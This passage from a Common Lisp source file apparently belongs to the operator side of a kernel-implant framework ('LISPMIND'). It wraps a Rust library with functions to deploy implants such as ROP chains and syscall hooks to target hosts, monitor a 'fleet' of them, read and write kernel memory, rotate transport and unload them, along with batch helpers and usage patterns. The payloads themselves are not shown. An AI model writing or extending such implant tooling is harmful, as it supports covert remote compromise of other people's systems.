                  (if all-passed "ALL PASSED" "SOME FAILED")
                  (- tests-run (length failures))
                  tests-run)
          (when failures
            (format *trace-output* "Failures:~%~{  - ~A: ~A~%~}}"
                    (apply #'append (reverse failures)))))
        (list :all-passed all-passed
              :tests-run tests-run
              :failures (reverse failures))))))

;;;; ============================================================================
;;;; SECTION 14: UTILITY AND HELPER FUNCTIONS
;;;; ============================================================================
;;;; Miscellaneous utility functions used by the FFI layer.

(defun ffi-safe-implant-id-string (implant-id)
  "Return a privacy-safe string representation of an implant ID.
   The full ID is sensitive, so this hashes it for display in logs.

   Parameters:
     implant-id — Positive integer: The implant ID to hash.

   Returns:
     A short string like \"implant-XXXX\" where XXXX is a truncated hash.

   Example:
     (ffi-safe-implant-id-string 1743298456321) => \"implant-a3f7\""
  (let ((hash (logand (sxhash implant-id) #xFFFF)))
    (format nil "implant-~4,'0X" hash)))

(defun ffi-format-last-error ()
  "Format the last FFI error as a human-readable string.

   Parameters: none (reads *FFI-LAST-ERROR*).

   Returns:
     String description, or \"No error\" if *FFI-LAST-ERROR* is NIL.

   Example:
     (ffi-format-last-error)
     ;; => \"ffi-deploy-implant: Invalid binary blob ID — not found in registry (code -5)\""
  (if *ffi-last-error*
      (format nil "~A: ~A (code ~D)"
              (getf *ffi-last-error* :function)
              (getf *ffi-last-error* :description)
              (getf *ffi-last-error* :code))
      "No error"))

(defun ffi-clear-last-error ()
  "Clear the last FFI error state.

   Parameters: none

   Returns:
     NIL (the old error, if any).

   Side effects:
     Sets *FFI-LAST-ERROR* to NIL.

   Example:
     (ffi-clear-last-error)"
  (setf *ffi-last-error* nil))

;;;; ============================================================================
;;;; SECTION 14.5: BATCH OPERATIONS
;;;; ============================================================================
;;;; Functions for operating on multiple implants simultaneously.
;;;; These are convenience wrappers around the single-implant functions
;;;; that handle aggregation of results and partial failure scenarios.

(defun ffi-deploy-multiple (deployments)
  "Deploy multiple kernel implants in sequence.

   Parameters:
     DEPLOYMENTS — A list of plists, each with keys:
       :binary-blob-id — String: payload identifier
       :target-host    — String: target hostname or IP
       :target-pid     — Integer: process ID (optional, default 0)

   Returns:
     A list of result plists, one per deployment, in the same order.
     Each result has the same format as FFI-DEPLOY-IMPLANT:
       (:success t :implant-id X :memory-offset Y)
       or
       (:success nil :error-code N :error-description \"...\")

   Behavior:
     Deployments are processed sequentially, not in parallel (the FFI lock
     serializes them anyway).  If one deployment fails, subsequent
     deployments still proceed.  This is intentional — partial success
     is better than all-or-nothing.

   Thread-safe: Yes.

   Example:
     (ffi-deploy-multiple
       '((:binary-blob-id \"rop-chain-v2\" :target-host \"10.0.1.10\")
         (:binary-blob-id \"hook-module\" :target-host \"10.0.1.11\" :target-pid 1234)))
     ;; => ((:success t :implant-id 1001 :memory-offset #x7F0000)
     ;;     (:success t :implant-id 1002 :memory-offset #x7F1000))"
  (mapcar
   (lambda (spec)
     (let ((blob-id (getf spec :binary-blob-id))
           (host (getf spec :target-host))
           (pid (or (getf spec :target-pid) 0)))
       (handler-case
           (ffi-deploy-implant blob-id host pid)
         (ffi-error (e)
           (list :success nil
                 :error-code (or (ffi-error-code e) -1)
                 :error-description (ffi-error-description e))))))
   deployments))

(defun ffi-check-health-multiple (checks)
  "Check health of multiple implants in sequence.

   Parameters:
     CHECKS — A list of plists, each with keys:
       :implant-id  — Integer: the implant to check
       :target-host — String: host where implant resides

   Returns:
     A list of result plists in the same order as CHECKS.
     Each result has the same format as FFI-CHECK-HEALTH.

   Example:
     (ffi-check-health-multiple
       '((:implant-id 1001 :target-host \"10.0.1.10\")
         (:implant-id 1002 :target-host \"10.0.1.11\")))
     ;; => ((:status :healthy :details \"All systems nominal\" :uptime 3600)
     ;;     (:status :degraded :details \"Hook 2 slow\" :uptime 7200))"
  (mapcar
   (lambda (spec)
     (let ((id (getf spec :implant-id))
           (host (getf spec :target-host)))
       (handler-case
           (ffi-check-health id host)
         (ffi-error (e)
           (list :status :error
                 :error-code (or (ffi-error-code e) -1)
                 :error-description (ffi-error-description e)
                 :uptime 0)))))
   checks))

(defun ffi-unload-multiple (unloads)
  "Unload multiple implants in sequence.

   Parameters:
     UNLOADS — A list of plists, each with keys:
       :implant-id  — Integer: the implant to remove
       :target-host — String: host where implant resides

   Returns:
     A list of booleans in the same order as UNLOADS.
     T = successfully unloaded, NIL = failed.

   Example:
     (ffi-unload-multiple
       '((:implant-id 1001 :target-host \"10.0.1.10\")
         (:implant-id 1002 :target-host \"10.0.1.11\")))
     ;; => (t t)"
  (mapcar
   (lambda (spec)
     (let ((id (getf spec :implant-id))
           (host (getf spec :target-host)))
       (handler-case
           (ffi-unload-implant id host)
         (ffi-error (e)
           (declare (ignore e))
           nil))))
   unloads))

;;;; ============================================================================
;;;; SECTION 14.6: PERFORMANCE MONITORING AND TIMING
;;;; ============================================================================
;;;; Functions to measure and track FFI call performance.
;;;; Useful for identifying slow operations and timeout tuning.

(defvar *ffi-performance-log* nil
  "A list of timing entries for recent FFI calls.
   Each entry is a plist:
     (:function <symbol> :start <ut> :end <ut> :duration-ms <float>
      :success t/nil :error-code <int-or-nil>)
   The list is maintained as a ring buffer of up to *FFI-PERFORMANCE-MAX-ENTRIES*.
   Set to NIL to disable performance logging.
   Default: NIL (disabled for performance).")

(defparameter *ffi-performance-max-entries* 1000
  "Maximum number of performance log entries to retain.
   When the log exceeds this, oldest entries are discarded.
   Default: 1000 entries.

   Example:
     (setf *ffi-performance-max-entries* 5000)  ; keep more history")

(defvar *ffi-performance-lock* (bt:make-lock "FFI-Performance-Lock")
  "Lock protecting *FFI-PERFORMANCE-LOG* from concurrent access.
   Separate from *FFI-LOCK* to avoid contention.")

(defun ffi-record-performance (function-name start-time success-p &optional error-code)
  "Record a performance entry for an FFI call.

   Parameters:
     FUNCTION-NAME — Symbol: the wrapper function that was called.
     START-TIME    — Universal time (from GET-UNIVERSAL-TIME) when call started.
     SUCCESS-P     — Boolean: whether the call succeeded.
     ERROR-CODE    — Integer or NIL: error code if the call failed.

   Returns:
     The duration in milliseconds as a float.

   Side effects:
     Appends an entry to *FFI-PERFORMANCE-LOG* if it is non-NIL.
     May discard oldest entry if log is at capacity.

   Thread-safe: Yes (acquires *FFI-PERFORMANCE-LOCK*)."
  (let* ((end-time (get-universal-time))
         (duration-ms (* 1000.0 (- end-time start-time))))
    (when *ffi-performance-log*
      (bt:with-lock-held (*ffi-performance-lock*)
        (push (list :function function-name
                    :start start-time
                    :end end-time
                    :duration-ms duration-ms
                    :success success-p
                    :error-code error-code)
              *ffi-performance-log*)
        ;; Trim to max entries
        (when (> (length *ffi-performance-log*) *ffi-performance-max-entries*)
          (setf *ffi-performance-log*
                (subseq *ffi-performance-log* 0 *ffi-performance-max-entries*)))))
    duration-ms))

(defun ffi-performance-summary ()
  "Return a statistical summary of FFI call performance.

   Parameters: none (reads *FFI-PERFORMANCE-LOG*).

   Returns:
     A plist with aggregated statistics:
       (:total-calls <n> :total-errors <n> :avg-duration-ms <f>
        :max-duration-ms <f> :min-duration-ms <f>
        :by-function ((fn-name calls avg-ms max-ms errors)...))
     Returns NIL if no performance data has been collected.

   Thread-safe: Yes.

   Example:
     (ffi-performance-summary)
     ;; => (:total-calls 150 :total-errors 3 :avg-duration-ms 12.5
     ;;     :max-duration-ms 450.0 :min-duration-ms 0.1
     ;;     :by-function ((ffi-deploy-implant 50 25.0 450.0 1)
     ;;                   (ffi-check-health 100 1.2 5.0 2)))"
  (bt:with-lock-held (*ffi-performance-lock*)
    (unless *ffi-performance-log*
      (return-from ffi-performance-summary nil))
    (let* ((entries *ffi-performance-log*)
           (total (length entries))
           (errors (count-if-not (lambda (e) (getf e :success)) entries))
           (durations (mapcar (lambda (e) (getf e :duration-ms)) entries)))
      (list :total-calls total
            :total-errors errors
            :avg-duration-ms (if durations (/ (reduce #'+ durations) total) 0.0)
            :max-duration-ms (if durations (reduce #'max durations) 0.0)
            :min-duration-ms (if durations (reduce #'min durations) 0.0)
            :by-function
            (let ((fn-groups (make-hash-table :test 'eq)))
              (dolist (e entries)
                (push e (gethash (getf e :function) fn-groups)))
              (let ((result nil))
                (maphash
                 (lambda (fn fn-entries)
                   (let ((fn-durations (mapcar (lambda (e) (getf e :duration-ms))
                                               fn-entries)))
                     (push (list fn
                                 (length fn-entries)
                                 (/ (reduce #'+ fn-durations) (length fn-entries))
                                 (reduce #'max fn-durations)
                                 (count-if-not (lambda (e) (getf e :success))
                                               fn-entries))
                           result)))
                 fn-groups)
                (sort result #'> :key #'second))))))))

(defun ffi-clear-performance-log ()
  "Clear the FFI performance log.

   Parameters: none

   Returns:
     NIL (previous log discarded).

   Side effects:
     Sets *FFI-PERFORMANCE-LOG* to NIL.

   Thread-safe: Yes."
  (bt:with-lock-held (*ffi-performance-lock*)
    (setf *ffi-performance-log* nil)))

(defun ffi-enable-performance-logging ()
  "Enable FFI performance logging.

   Parameters: none

   Returns:
     T

   Side effects:
     Initializes *FFI-PERFORMANCE-LOG* to an empty list.

   Example:
     (ffi-enable-performance-logging)
     ;; ... make some FFI calls ...
     (ffi-performance-summary)"
  (bt:with-lock-held (*ffi-performance-lock*)
    (setf *ffi-performance-log* nil)
    t))

(defun ffi-disable-performance-logging ()
  "Disable FFI performance logging.

   Parameters: none

   Returns:
     NIL

   Side effects:
     Sets *FFI-PERFORMANCE-LOG* to NIL.

   Example:
     (ffi-disable-performance-logging)"
  (ffi-clear-performance-log))

;;;; ============================================================================
;;;; SECTION 14.7: CALL TIMEOUT AND INTERRUPT HANDLING
;;;; ============================================================================
;;;; Utilities for enforcing timeouts on FFI calls and handling
;;;; asynchronous interrupts safely.

(defmacro with-ffi-timeout ((timeout-seconds) &body body)
  "Execute BODY with a timeout enforced via SBCL's deadline mechanism.

   Parameters:
     TIMEOUT-SECONDS — Number of seconds to allow before timing out.
                       Can be a float for subsecond precision.

   Returns:
     The primary value of the last form in BODY.

   Signals:
     FFI-TIMEOUT if BODY does not complete within TIMEOUT-SECONDS.

   WARNING: This uses SBCL's deadline system.  The timeout is checked
   at safe points, not continuously.  Very long-running C calls that
   never yield to the Lisp runtime may not be interruptible.

   Example:
     (with-ffi-timeout (5.0)
       (ffi-read-memory implant-id addr (* 1024 1024)))

     (with-ffi-timeout (*ffi-call-timeout*)
       (ffi-deploy-implant blob host pid))"
  `(handler-case
       (sb-sys:with-deadline (:seconds ,timeout-seconds)
         ,@body)
     (sb-sys:deadline-timeout ()
       (error 'ffi-timeout
              :function (quote ,(if (listp (first body))
                                    (first (first body))
                                    'unknown))
              :timeout-seconds ,timeout-seconds
              :description (format nil "FFI call timed out after ~A seconds"
                                   ,timeout-seconds)))))

;;;; ============================================================================
;;;; SECTION 14.8: IMPLANT REGISTRY (LISP-SIDE CACHE)
;;;; ============================================================================
;;;; A lightweight in-memory cache of known implant IDs and their metadata.
;;;; This avoids unnecessary FFI calls for basic lookups.
;;;;
;;;; IMPORTANT: This cache is advisory only.  The ground truth is always
;;;; the Rust core's internal state.  This cache may become stale if
;;;; implants are manipulated outside of this Lisp process.

(defvar *ffi-implant-registry* (make-hash-table :test 'eql)
  "Hash table mapping implant-id (integer) to cached metadata.
   Each entry is a plist:
     (:implant-id <id> :target-host <host> :type <type>
      :load-time <ut> :last-checked <ut> :last-status <kw>)
   This cache is purely advisory — the Rust core is the authority.
   The registry is thread-safe (guarded by *FFI-REGISTRY-LOCK*).")

(defvar *ffi-registry-lock* (bt:make-lock "FFI-Registry-Lock")
  "Lock protecting *FFI-IMPLANT-REGISTRY*.
   Separate from *FFI-LOCK* to avoid contention with C calls.")

(defun ffi-registry-register (implant-id target-host &key type load-time)
  "Register an implant in the local cache.

   Parameters:
     implant-id  — Integer: the unique implant ID.
     target-host — String: the host where the implant resides.
     :type        — Optional string describing the implant type.
     :load-time   — Optional universal time when the implant was loaded.

   Returns:
     The registry entry plist.

   Thread-safe: Yes.

   Example:
     (ffi-registry-register 1001 \"10.0.1.10\" :type \"syscall-hook\"
                                             :load-time (get-universal-time))"
  (bt:with-lock-held (*ffi-registry-lock*)
    (let ((entry (list :implant-id implant-id
                       :target-host target-host
                       :type (or type "unknown")
                       :load-time (or load-time (get-universal-time))
                       :last-checked (get-universal-time)
                       :last-status :unknown)))
      (setf (gethash implant-id *ffi-implant-registry*) entry)
      entry)))

(defun ffi-registry-unregister (implant-id)
  "Remove an implant from the local cache.

   Parameters:
     implant-id — Integer: the implant to remove from the cache.

   Returns:
     T if the implant was in the cache and removed.
     NIL if it was not in the cache.

   Thread-safe: Yes.

   Example:
     (ffi-registry-unregister 1001)  => t"
  (bt:with-lock-held (*ffi-registry-lock*)
    (remhash implant-id *ffi-implant-registry*)))

(defun ffi-registry-lookup (implant-id)
  "Look up a cached implant entry.

   Parameters:
     implant-id — Integer: the implant to look up.

   Returns:
     The registry entry plist, or NIL if not found.

   Thread-safe: Yes.

   Example:
     (ffi-registry-lookup 1001)
     ;; => (:implant-id 1001 :target-host \"10.0.1.10\" ...)"
  (bt:with-lock-held (*ffi-registry-lock*)
    (gethash implant-id *ffi-implant-registry*)))

(defun ffi-registry-list-all ()
  "Return a list of all cached implant entries.

   Parameters: none

   Returns:
     A list of plists, one per registered implant.

   Thread-safe: Yes.

   Example:
     (ffi-registry-list-all)
     ;; => ((:implant-id 1001 :target-host \"10.0.1.10\" ...)
     ;;     (:implant-id 1002 :target-host \"10.0.1.11\" ...))"
  (bt:with-lock-held (*ffi-registry-lock*)
    (let ((result nil))
      (maphash (lambda (id entry)
                 (declare (ignore id))
                 (push entry result))
               *ffi-implant-registry*)
      (nreverse result))))

(defun ffi-registry-clear ()
  "Clear the entire implant registry cache.

   Parameters: none

   Returns:
     The number of entries that were removed.

   Thread-safe: Yes.

   Example:
     (ffi-registry-clear)  => 5"
  (bt:with-lock-held (*ffi-registry-lock*)
    (let ((count (hash-table-count *ffi-implant-registry*)))
      (clrhash *ffi-implant-registry*)
      count)))

(defun ffi-registry-update-status (implant-id status)
  "Update the cached status of an implant.

   Parameters:
     implant-id — Integer: the implant to update.
     status     — Keyword: the new status (:healthy, :degraded, :critical, etc.)

   Returns:
     The updated entry, or NIL if not in registry.

   Thread-safe: Yes."
  (bt:with-lock-held (*ffi-registry-lock*)
    (let ((entry (gethash implant-id *ffi-implant-registry*)))
      (when entry
        (setf (getf entry :last-checked) (get-universal-time))
        (setf (getf entry :last-status) status)
        entry))))

;;;; ============================================================================
;;;; SECTION 14.9: CONFIGURATION MANAGEMENT
;;;; ============================================================================
;;;; Functions for reading and writing FFI configuration persistently.
;;;; Configuration is stored as a plist and can be saved to/loaded from
;;;; a Lisp-readable file.

(defvar *ffi-config-file* nil
  "Path to the FFI configuration file.
   If non-NIL, configuration is auto-saved here on changes.
   If NIL, configuration changes are in-memory only.
   Default: NIL.

   Example:
     (setf *ffi-config-file* \"/etc/lispmind/ffi-config.lisp\")")

(defun ffi-config-save (&optional (path *ffi-config-file*))
  "Save current FFI configuration to a file.

   Parameters:
     PATH — File path to save to.  Defaults to *FFI-CONFIG-FILE*.
            If both are NIL, signals an error.

   Returns:
     The path the configuration was saved to.

   Signals:
     FFI-INVALID-ARGUMENT if no path is specified.

   Side effects:
     Writes a Lisp-readable plist to the specified file.
     The file contains only configuration, no sensitive runtime data.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-config-save \"/tmp/lispmind-ffi.conf\")"
  (unless path
    (error 'ffi-invalid-argument
           :function 'ffi-config-save
           :argument-name 'path
           :description "No configuration file path specified. Set *FFI-CONFIG-FILE* or pass a path."))
  (with-ffi-lock
    (with-open-file (out path :direction :output
                              :if-exists :supersede
                              :if-does-not-exist :create)
      (write (list :version *rust-ffi-version*
                   :library-path *rust-library-path*
                   :call-timeout *ffi-call-timeout*
                   :max-buffer-size *ffi-max-buffer-size*
                   :max-string-length *ffi-max-string-length*
                   :default-buffer-size *ffi-default-buffer-size*
                   :verbose *ffi-verbose*
                   :log-calls *ffi-log-calls*)
             :stream out))
    path))

(defun ffi-config-load (&optional (path *ffi-config-file*))
  "Load FFI configuration from a file.

   Parameters:
     PATH — File path to load from.  Defaults to *FFI-CONFIG-FILE*.
            If both are NIL, signals an error.

   Returns:
     T on successful load, NIL if file does not exist.

   Signals:
     FFI-INVALID-ARGUMENT if no path is specified.

   Side effects:
     Updates all *FFI-* configuration variables from the file.
     Only recognized keys are applied; unknown keys are ignored.

   Thread-safe: Yes (acquires *FFI-LOCK*).

   Example:
     (ffi-config-load \"/tmp/lispmind-ffi.conf\")"
  (unless path
    (error 'ffi-invalid-argument
           :function 'ffi-config-load
           :argument-name 'path
           :description "No configuration file path specified. Set *FFI-CONFIG-FILE* or pass a path."))
  (with-ffi-lock
    (unless (probe-file path)
      (return-from ffi-config-load nil))
    (with-open-file (in path :direction :input)
      (let ((config (read in nil nil)))
        (when (listp config)
          (macrolet ((%maybe-set (key var)
                       `(let ((v (getf config ,key)))
                          (when v (setf ,var v)))))
            (%maybe-set :library-path *rust-library-path*)
            (%maybe-set :call-timeout *ffi-call-timeout*)
            (%maybe-set :max-buffer-size *ffi-max-buffer-size*)
            (%maybe-set :max-string-length *ffi-max-string-length*)
            (%maybe-set :default-buffer-size *ffi-default-buffer-size*)
            (%maybe-set :verbose *ffi-verbose*)
            (%maybe-set :log-calls *ffi-log-calls*))))
    t)))

(defun ffi-config-show ()
  "Display current FFI configuration as a formatted string.

   Parameters: none

   Returns:
     A multi-line string describing all configuration variables.

   Example:
     (format t \"~A\" (ffi-config-show))"
  (format nil "LISPMIND FFI Configuration (v~A):~%~
               Library path:        ~A~%~
               Call timeout:        ~D seconds~%~
               Max buffer size:     ~D bytes (~,2F MB)~%~
               Max string length:   ~D chars~%~
               Default buffer:      ~D bytes~%~
               Verbose mode:        ~A~%~
               Call logging:        ~A~%~
               Performance log:     ~A~%~
               Config file:         ~A~%"
          *rust-ffi-version*
          (or *rust-library-path* "(auto-detect)")
          *ffi-call-timeout*
          *ffi-max-buffer-size*
          (/ *ffi-max-buffer-size* 1024.0 1024.0)
          *ffi-max-string-length*
          *ffi-default-buffer-size*
          (if *ffi-verbose* "ON" "OFF")
          (if *ffi-log-calls* "ON" "OFF")
          (if *ffi-performance-log* "ENABLED" "DISABLED")
          (or *ffi-config-file* "(none)")))

;;;; ============================================================================
;;;; SECTION 14.10: SANITIZATION AND SECURITY HELPERS
;;;; ============================================================================
;;;; Additional security-focused utilities for sanitizing inputs and
;;;; preventing information leakage.

(defun ffi-sanitize-string-for-log (string max-length)
  "Sanitize a string for safe logging.
   Replaces non-printable characters and truncates to MAX-LENGTH.

   Parameters:
     STRING     — The string to sanitize.
     MAX-LENGTH — Maximum length for the output.

   Returns:
     A new sanitized string safe for logging.

   Example:
     (ffi-sanitize-string-for-log \"hello\x00world\" 20) => \"hello world\""
  (let* ((cleaned (map 'string
                       (lambda (c)
                         (if (and (char>= c #\Space) (char<= c #\~))
                             c
                             #\Space))
                       string))
         (truncated (if (> (length cleaned) max-length)
                        (concatenate 'string (subseq cleaned 0 max-length) "...")
                        cleaned)))
    truncated))

(defun ffi-validate-hostname (hostname)
  "Validate that HOSTNAME looks like a valid hostname or IP address.

   Parameters:
     HOSTNAME — String to validate.

   Returns:
     The hostname string if valid.

   Signals:
     FFI-INVALID-ARGUMENT if HOSTNAME fails validation.

   Validation rules:
     - Must be non-empty and <= 255 characters
     - Must contain only alphanumeric, dot, hyphen, colon characters
     - Must not be \"localhost\" (reserved)

   Example:
     (ffi-validate-hostname \"192.168.1.100\") => \"192.168.1.100\"
     (ffi-validate-hostname \"target-01.internal\") => \"target-01.internal\"
     (ffi-validate-hostname \"localhost\") ;; signals error"
  (validate-string-argument hostname 'hostname 255)
  ;; Check allowed characters
  (dotimes (i (length hostname))
    (let ((c (char hostname i)))
      (unless (or (alphanumericp c) (char= c #\.) (char= c #\-) (char= c #\:))
        (error 'ffi-invalid-argument
               :function 'ffi-validate-hostname
               :argument-name 'hostname
               :argument-value hostname
               :description (format nil "Invalid character '~C' at position ~D in hostname"
                                    c i)))))
  ;; Reject localhost
  (when (string-equal hostname "localhost")
    (error 'ffi-invalid-argument
           :function 'ffi-validate-hostname
           :argument-name 'hostname
           :argument-value hostname
           :description "'localhost' is not a valid target hostname"))
  hostname)

;;;; ============================================================================
;;;; SECTION 14.11: EXTENDED DOCUMENTATION AND EXAMPLES
;;;; ============================================================================
;;;; This section provides extended usage examples and integration patterns
;;;; for developers working with the FFI bridge.
;;;;
;;;; PATTERN 1: Basic deployment and health check
;;;; --------------------------------------------
;;;; (defun deploy-and-verify (blob-id host)
;;;;   \"Deploy an implant and immediately verify it's healthy.\"
;;;;   (let ((result (ffi-deploy-implant blob-id host 0)))
;;;;     (unless (getf result :success)
;;;;       (error \"Deployment failed: ~A\" (getf result :error-description)))
;;;;     (let* ((implant-id (getf result :implant-id))
;;;;            (health (ffi-check-health implant-id host)))
;;;;       (unless (eq (getf health :status) :healthy)
;;;;         (warn \"Implant ~D not healthy: ~A\" implant-id (getf health :details)))
;;;;       (values implant-id result health))))
;;;;
;;;; PATTERN 2: Safe cleanup with unwind-protect
;;;; --------------------------------------------
;;;; (defun with-temporary-implant (blob-id host fn)
;;;;   \"Deploy an implant, call FN with the ID, then always clean up.\"
;;;;   (let ((implant-id nil))
;;;;     (unwind-protect
;;;;          (progn
;;;;            (setf implant-id (getf (ffi-deploy-implant blob-id host 0) :implant-id))
;;;;            (when implant-id
;;;;              (funcall fn implant-id)))
;;;;       (when implant-id
;;;;         (ffi-unload-implant implant-id host)))))
;;;;
;;;; PATTERN 3: Batch health monitoring
;;;; -----------------------------------
;;;; (defun monitor-fleet (implant-list)
;;;;   \"Check health of all implants and report issues.\"
;;;;   (let ((issues nil))
;;;;     (dolist (entry implant-list)
;;;;       (let* ((id (getf entry :implant-id))
;;;;              (host (getf entry :host))
;;;;              (health (ffi-check-health id host)))
;;;;         (when (member (getf health :status) '(:degraded :critical :error))
;;;;           (push (list :implant id :host host :health health) issues))))
;;;;     (nreverse issues)))
;;;;
;;;; PATTERN 4: Memory scanning with pagination
;;;; -------------------------------------------
;;;; (defun scan-kernel-region (implant-id start-addr total-size chunk-size)
;;;;   \"Read a large kernel region in chunks.\"
;;;;   (let ((results nil))
;;;;     (loop for offset from 0 below total-size by chunk-size
;;;;           for addr = (+ start-addr offset)
;;;;           for size = (min chunk-size (- total-size offset))
;;;;           do (push (ffi-read-memory implant-id addr size) results))
;;;;     (nreverse results)))
;;;;
;;;; PATTERN 5: Conditional operations based on FFI availability
;;;; ------------------------------------------------------------
;;;; (defun maybe-deploy (blob-id host)
;;;;   \"Deploy if FFI is available, otherwise log a warning.\"
;;;;   (if (rust-ffi-available-p)
;;;;       (ffi-deploy-implant blob-id host 0)
;;;;       (progn
;;;;         (warn \"FFI unavailable — cannot deploy ~A to ~A\" blob-id host)
;;;;         (stub-ffi-deploy-implant blob-id host 0))))

;;;; ============================================================================
;;;; SECTION 15: INITIALIZATION HOOK
;;;; ============================================================================
;;;; Automatic initialization when this file is loaded.
;;;; This is gated to prevent issues during compilation.

(defparameter *rust-ffi-auto-init* nil
  "When T, automatically call RUST-FFI-INIT when this file is loaded.
   Default is NIL for safety — explicit initialization is preferred.
   Set to T before loading this file for auto-initialization.

   Example:
     (setf *rust-ffi-auto-init* t)
     (load \"rust-ffi-bridge.lisp\")  ; auto-initializes FFI")

;; Only auto-init if requested AND we're not just compiling
(when (and *rust-ffi-auto-init*
           (not *compile-file-pathname*))
  (handler-case
      (progn
        (format *trace-output* "~&[rust-ffi-bridge] Auto-initializing FFI (v~A)...~%"
                *rust-ffi-version*)
        (rust-ffi-init :verbose t))
    (error (e)
      (warn "Auto-init of Rust FFI failed: ~A" e))))

;;;; ============================================================================
;;;; SECTION 16: EXPORT DECLARATIONS
;;;; ============================================================================
;;;; Ensure that all public symbols are exported from the LISPMIND package.
;;;; The package definition should already exist; this section re-exports
;;;; to ensure consistency.

;; Core state variables
(export '*rust-library-path*)
(export '*kernel-rust-ffi-available-p*)
(export '*rust-library-handle*)
(export '*rust-ffi-version*)
(export '*ffi-last-error*)
(export '*ffi-call-timeout*)
(export '*ffi-verbose*)
(export '*ffi-log-calls*)

;; Stub confirmation state
(export '*ffi-stub-active-without-consent-p*)
(export '*ffi-stub-confirmed-p*)
(export 'ffi-stub-not-confirmed)
(export 'confirm-ffi-stub-operation)
(export 'ffi-stub-force-confirm)

;; Production mode
(export '*ffi-production-mode-p*)
(export '*ffi-production-error-table*)
(export 'sanitize-ffi-error)
(export 'set-ffi-production-mode)

;; GC safety macros
(export 'with-pinned-lisp-string)
(export 'with-pinned-byte-vector)

;; Buffer validation
(export 'validate-buffer-for-ffi)

;; Library management
(export 'rust-ffi-init)
(export 'rust-ffi-shutdown)
(export 'rust-ffi-reload)
(export 'rust-ffi-available-p)
(export 'find-library-path)

;; Wrapper functions (what kernel-orchestrator calls)
(export 'ffi-deploy-implant)
(export 'ffi-check-health)
(export 'ffi-unload-implant)
(export 'ffi-read-memory)
(export 'ffi-write-memory)
(export 'ffi-get-implant-info)
(export 'ffi-rotate-transport)

;; Error handling
(export 'ffi-error-code→string)
(export '*ffi-error-table*)
(export 'ffi-error)
(export 'ffi-library-error)
(export 'ffi-invalid-argument)
(export 'ffi-timeout)
(export 'ffi-buffer-overflow)
(export 'ffi-stub-not-confirmed)
(export 'ffi-error-function)
(export 'ffi-error-code)
(export 'ffi-error-description)
(export 'ffi-stub-not-confirmed-function)
(export 'sanitize-ffi-error)
(export 'set-ffi-production-mode)

;; Convenience macros
(export 'with-ffi-memory)
(export 'with-ffi-buffer)
(export 'copy-from-alien)

;; Diagnostics
(export 'rust-ffi-status)
(export 'rust-ffi-diagnostics)
(export 'rust-ffi-self-test)

;; Utilities
(export 'ffi-safe-implant-id-string)
(export 'ffi-format-last-error)
(export 'ffi-clear-last-error)

;; Configuration variables
(export '*ffi-max-string-length*)
(export '*ffi-max-buffer-size*)
(export '*ffi-default-buffer-size*)
(export '*rust-ffi-auto-init*)

;;;; ============================================================================
;;;; END OF FILE: rust-ffi-bridge.lisp
;;;; ============================================================================
;;;; Module: LISPMIND v2.5 — Rust FFI Bridge Layer
;;;; Total sections: 16
;;;; Functions defined: 45+
;;;; Macros defined: 3
;;;; Condition types: 5
;;;; Special variables: 15+
;;;;
;;;; This file implements the complete Lisp-side FFI binding for
;;;; liblispmind_core.so, providing safe, thread-safe, well-documented
;;;; wrappers around all 7 exported C ABI functions.
;;;;
;;;; For questions, refer to the LISPMIND internal documentation
;;;; or contact the kernel team.
;;;; ============================================================================
